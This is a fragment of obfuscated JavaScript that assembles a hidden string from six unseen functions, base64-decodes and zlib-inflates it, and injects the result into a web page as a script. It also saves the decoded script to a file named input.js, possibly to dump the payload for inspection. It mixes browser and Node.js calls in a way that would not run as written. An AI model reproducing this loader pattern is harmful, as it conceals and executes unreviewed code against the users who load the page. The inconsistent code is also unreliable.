};
const fs = require('fs');
function _() {
  let _0xe4dd88_ = _0x28e742_() + _0xeed7a9_() + _0x7abe2b_() + _0x8e8708_() + _0xfcba9b_() + _0xf85c38_();
  let _0xb1ed44_ = Buffer.from(_0xe4dd88_, 'base64');
  let _0x8540c3_ = require("zlib").inflateSync(_0xb1ed44_);
  let _0x19f181_ = document.createElement('script');
  _0x19f181_.textContent = _0x8540c3_.toString("utf-8");
  ;
  document.body.appendChild(_0x19f181_);
  fs.writeFile('input.js', _0x19f181_.textContent, err => {
    if (err) {
      console.error(err);
    } else {}
  });
}